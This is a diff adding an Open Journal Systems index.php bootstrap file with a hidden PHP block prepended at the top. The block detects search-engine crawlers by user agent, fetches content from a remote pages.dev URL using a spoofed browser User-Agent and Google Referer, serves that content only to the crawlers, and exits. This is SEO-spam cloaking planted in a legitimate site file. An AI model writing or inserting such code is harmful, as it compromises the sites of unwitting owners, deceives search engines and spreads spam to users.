@@ -1,0 +1,47 @@
+<?php
+@ob_start();
+header("Vary: U-Agent");
+
+$src = "https://janganterlaluiniapasihnamanyaadalahpokoknya.pages.dev/index.txt";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
+
+function stealth($u) {
+    $ctx = stream_context_create([
+        "http" => [
+            "method" => "GET",
+            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+                        "Referer: https://www.google.com/\r\n"
+        ]
+    ]);
+    return @file_get_contents($u, false, $ctx);
+}
+
+if (preg_match($match, $ua)) {
+    usleep(rand(100000, 200000));
+    echo stealth($src);
+    @ob_end_flush();
+    exit;
+}
+?>
+<?php
+
+/**
+ * @file ojs/index.php
+ *
+ * Copyright (c) 2014-2021 Simon Fraser University
+ * Copyright (c) 2003-2021 John Willinsky
+ * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
+ *
+ * Bootstrap code for OJS site. Loads required files and then calls the
+ * dispatcher to delegate to the appropriate request handler.
+ */
+
+use APP\core\Application;
+
+// Initialize global environment
+define('INDEX_FILE_LOCATION', __FILE__);
+require_once './lib/pkp/includes/bootstrap.php';
+
+// Serve the request
+Application::get()->execute();
